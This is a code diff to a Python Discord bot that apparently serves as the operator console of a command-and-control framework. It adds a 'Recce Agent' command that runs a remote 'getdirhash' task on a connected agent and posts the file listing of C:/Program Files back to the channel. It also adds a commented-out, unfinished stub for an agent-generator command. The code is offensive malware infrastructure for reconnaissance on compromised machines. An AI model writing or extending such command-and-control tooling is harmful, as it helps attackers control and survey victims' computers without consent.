@@ -571,6 +571,37 @@ async def check_hash(ctx):
     except Exception as e:
         await ctx.reply(f"An error occurred: {e}")
 
+# Recce Agent commands
+@bot.command()
+async def get_dir(ctx):
+    try:
+        channel_name = ctx.channel.name
+    except:
+        channel_name = ctx.name
+    try:
+        if channel_name not in myListener.connections:
+            await ctx.reply(f"[-] {channel_name} is not active")
+            return
+        output = await myListener.execute_remotely(channel_name, "getdirhash")
+        if isinstance(output, list):
+            await ctx.send("[+] List of Files in `C:/Program Files`:")
+            for file in output:
+                await ctx.send(file)
+            return
+    except Exception as e:
+        await ctx.reply(f"An error occurred: {e}")  
+        
+# c2-generator.py command
+# @bot.command()
+# async def gen_agent(ctx):
+#     try:
+#         channel_name = ctx.channel.name
+#     except:
+#         channel_name = ctx.name
+#     try:
+        
+        
+        
 @bot.command()
 async def sessions(ctx):
     await ctx.send(myListener.list_agents())
